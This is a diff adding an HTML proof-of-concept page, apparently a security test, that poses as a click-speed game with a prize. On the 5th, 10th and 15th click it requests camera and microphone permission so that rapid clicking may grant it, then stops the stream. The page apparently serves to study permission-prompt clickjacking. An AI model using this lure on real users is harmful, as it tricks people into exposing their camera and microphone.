@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chrome Permission Clickjacking Test</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #121212; color: white; overflow: hidden; }
+        #game-target {
+            width: 200px; height: 200px; background: radial-gradient(circle, #ff0000, #880000);
+            border-radius: 50%; margin: 50px auto; line-height: 200px; font-weight: bold;
+            cursor: pointer; user-select: none; transition: transform 0.1s;
+        }
+        #game-target:active { transform: scale(0.9); }
+        .info { padding: 20px; color: #aaa; }
+        #log { font-family: monospace; color: #00ff00; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <h2>Click Fast Game!</h2>
+    <p class="info">Click the red circle 20 times to win a prize!</p>
+    
+    <div id="game-target">CLICK ME!</div>
+    <div id="score">Score: 0</div>
+    <div id="log"></div>
+
+    <script>
+        let score = 0;
+        const target = document.getElementById('game-target');
+        const scoreDisplay = document.getElementById('score');
+        const log = document.getElementById('log');
+
+        target.addEventListener('click', () => {
+            score++;
+            scoreDisplay.innerText = "Score: " + score;
+
+            // Trigger permission tepat saat user sedang aktif mengklik
+            // Kita coba di klik ke-5, ke-10, dan ke-15
+            if (score === 5 || score === 10 || score === 15) {
+                requestPermission();
+            }
+
+            if (score >= 20) {
+                target.innerText = "YOU WIN!";
+                target.style.background = "gold";
+            }
+        });
+
+        async function requestPermission() {
+            log.innerText = "Status: Triggering Permission...";
+            try {
+                // Minta akses kamera dan mikrofon sekaligus
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                log.innerText = "CRITICAL: PERMISSION GRANTED!";
+                log.style.color = "red";
+                log.style.fontWeight = "bold";
+                
+                // Matikan kamera langsung setelah tes berhasil
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                log.innerText = "Status: Permission Denied (" + err.name + ")";
+                log.style.color = "#00ff00";
+            }
+        }
+    </script>
+</body>
+</html>
